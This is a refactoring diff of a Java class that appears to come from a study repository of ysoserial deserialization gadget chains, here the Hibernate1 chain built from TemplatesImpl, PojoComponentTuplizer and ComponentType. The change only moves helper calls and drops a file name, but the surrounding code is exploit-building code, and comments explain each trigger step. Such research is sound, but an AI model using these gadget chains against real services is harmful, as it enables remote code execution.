@@ -3,6 +3,7 @@ package org.su18.serialize.ysoserial.Hibernate.Hibernate1;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.hibernate.engine.spi.TypedValue;
 import org.hibernate.type.Type;
+import org.su18.serialize.ysoserial.Utils.ClassUtil;
 import org.su18.serialize.ysoserial.Utils.SerializeUtil;
 
 import java.lang.reflect.Array;
@@ -17,8 +18,6 @@ import java.util.HashMap;
  * @author su18
  */
 public class Hibernate1 {
-
-	public static String fileName = "Hibernate1.bin";
 
 	public static void main(String[] args) throws Exception {
 
@@ -47,7 +46,7 @@ public class Hibernate1 {
 		}
 
 		// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
-		Object tuplizer = SerializeUtil.createInstanceUnsafely(pojoComponentTuplizerClass);
+		Object tuplizer = ClassUtil.createInstanceUnsafely(pojoComponentTuplizerClass);
 
 		// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
 		Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
@@ -57,7 +56,7 @@ public class Hibernate1 {
 		field.set(tuplizer, getters);
 
 		// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
-		Object type = SerializeUtil.createInstanceUnsafely(componentTypeClass);
+		Object type = ClassUtil.createInstanceUnsafely(componentTypeClass);
 
 		// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
 		Field field1 = componentTypeClass.getDeclaredField("componentTuplizer");
@@ -84,8 +83,8 @@ public class Hibernate1 {
 		valueField.setAccessible(true);
 		valueField.set(typedValue, tmpl);
 
-		SerializeUtil.writeObjectToFile(hashMap, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(hashMap);
+		SerializeUtil.readFileObject();
 	}
 
 }
